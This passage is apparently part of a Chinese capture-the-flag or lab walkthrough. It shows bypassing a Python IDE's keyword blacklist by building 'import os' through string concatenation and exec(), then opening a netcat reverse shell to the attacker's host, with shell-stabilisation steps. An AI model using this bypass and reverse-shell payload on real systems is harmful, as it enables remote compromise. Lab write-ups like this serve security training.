    二，漏洞利用

    进入/login页面尝试登入，登入后进入了一个Python IDE的界面

    可以在程序框输入代码，然后执行

    提示给了下面程序页面的一个源码

    def check_if_safe(code: str) -> bool:
    if 'import' in code: # import is too dangerous
        return False
    elif 'os' in code: # os is too dangerous
        return False
    elif 'open' in code: # opening files is also too dangerous
        return False
    else:
        return True

    就是不能直接执行程序不能包含import，os和open

    尝试字符串拼接执行

    str1='impor'+'t'+' o'+'s'
exec(str1)

    程序没有产生报错信息，也就是可以进行字符拼接，然后利用exec()函数执行相关命令

    写入反弹 shell，nc 监听

    str1='impor'+'t'+' o'+'s'
str2='o'+'s.system("nc 192.168.79.132 1234 -e /bin/bash")'
exec(str1)
exec(str2)

    连接成功，升级下shell

    1.在靶机上输入以下命令（使用机器上可用的 python 版本！）

    python3 -c 'import pty;pty.spawn("/bin/bash")';

    2.接下来，在靶机上输入以下命令来设置一些重要的环境变量：

    export SHELL=bash
export TERM=xterm-256color #允许 clear，并且有颜色

    3.键入 ctrl-z 以将 shell 发送到后台。

    4.设置 shell 以通过反向 shell 发送控制字符和其他原始输入。使用以下stty命令来执行此操作。

    stty raw -echo;fg

    回车一次后输入 rese 再回车将再次进入 shell 中：
